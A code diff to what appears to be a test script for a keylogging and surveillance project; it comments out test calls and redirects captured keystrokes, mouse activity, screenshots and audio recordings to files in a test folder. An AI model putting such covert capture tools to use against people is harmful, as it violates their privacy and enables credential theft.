@@ -6,10 +6,10 @@ import Mouselogger
 
 def main():
 
-    test_keylog(1)
-    test_mouselog(1)
-    test_getImage()
-    test_getSound()
+    # test_keylog(5)
+    # test_mouselog(1)
+    # test_getImage()
+    # test_getSound()
 
 
 def test_keylog(waittime):
@@ -17,6 +17,7 @@ def test_keylog(waittime):
     klog.start()
     time.sleep(waittime)
     klog.stop()
+    klog.write_on_file("test/keyboard.txt")
     # print(klog.keys)
 
 def test_mouselog(waittime):
@@ -24,7 +25,7 @@ def test_mouselog(waittime):
     mlog.start()
     time.sleep(waittime)
     mlog.stop()
-    mlog.write_on_file("mouse.txt")
+    mlog.write_on_file("test/mouse.txt")
     # print(mlog.move)
     # print(mlog.clic)
     # print(mlog.scroll)
@@ -32,15 +33,12 @@ def test_mouselog(waittime):
 def test_getImage():
     screen = getImage.GetImage()
     screen.takeScreen()
-    print(screen.image)
+    screen.takeScreen("test/image.png")
 
 def test_getSound():
     sound = getSound.getSound()
-    print()
-    print(sound.a_pyaudio)
-    print()
     sound.record(2)
-    sound.write_on_file("sound.wav")
+    sound.write_on_file("test/sound.wav")
 
 if __name__ == "__main__":
     main()
